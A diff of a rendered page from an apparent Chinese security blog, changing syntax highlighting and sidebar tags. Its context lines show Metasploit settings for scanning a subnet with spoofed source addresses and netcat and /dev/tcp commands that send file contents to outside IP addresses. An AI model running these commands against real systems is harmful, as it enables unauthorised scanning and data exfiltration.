@@ -539,7 +539,7 @@ msf &gt; show options
 msf &gt; <span style="color:#0086b3">set</span>  interface eth0
 msf &gt; <span style="color:#0086b3">set</span>  smac 00:0c:29:92:fd:85
 msf &gt; <span style="color:#0086b3">set</span>  rhosts 192.168.1.0/24
-msf &gt; <span style="color:#0086b3">set</span>  threads 20
+msf &gt; <span style="color:#0086b3">set</span>  threads <span style="color:#099">20</span>
 msf &gt; <span style="color:#0086b3">set</span>  shost 192.168.1.27
 msf &gt; run
 </code></pre></td></tr></table>
@@ -707,7 +707,7 @@ cat &lt; /dev/tcp/10.10.10.200/8000 &gt; 1.txt
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat test.txt | nc  47.107.82.71 8000
+<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat test.txt | nc  47.107.82.71 <span style="color:#099">8000</span>
 
 nc 47.107.82.71 <span style="color:#099">8000</span> &lt; 10000.txt
 </code></pre></td></tr></table>
@@ -1147,7 +1147,7 @@ Base64_Decode</p>
     
     <li><a href="https://blog.taielab.com/categories/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/">数字取证 (1)</a></li>
     
-    <li><a href="https://blog.taielab.com/categories/%E6%95%B0%E5%AD%97%E5%AE%89%E5%85%A8/">数字安全 (30)</a></li>
+    <li><a href="https://blog.taielab.com/categories/%E6%95%B0%E5%AD%97%E5%AE%89%E5%85%A8/">数字安全 (23)</a></li>
     
     <li><a href="https://blog.taielab.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库 (2)</a></li>
     
@@ -1202,8 +1202,6 @@ Base64_Decode</p>
     
     <a href="https://blog.taielab.com/tags/shadowsocks/">shadowsocks</a>
     
-    <a href="https://blog.taielab.com/tags/tor/">tor</a>
-    
     <a href="https://blog.taielab.com/tags/ubuntu/">ubuntu</a>
     
     <a href="https://blog.taielab.com/tags/vps/">vps</a>
@@ -1231,8 +1229,6 @@ Base64_Decode</p>
     <a href="https://blog.taielab.com/tags/%E6%AD%BB%E6%B4%BB%E5%8F%96%E8%AF%81/">死活取证</a>
     
     <a href="https://blog.taielab.com/tags/%E7%89%A9%E7%90%86%E5%85%A5%E4%BE%B5/">物理入侵</a>
-    
-    <a href="https://blog.taielab.com/tags/%E8%B8%8F%E9%9B%AA%E6%97%A0%E7%97%95%E7%B3%BB%E5%88%97/">踏雪无痕系列</a>
     
 </div>
     </section>
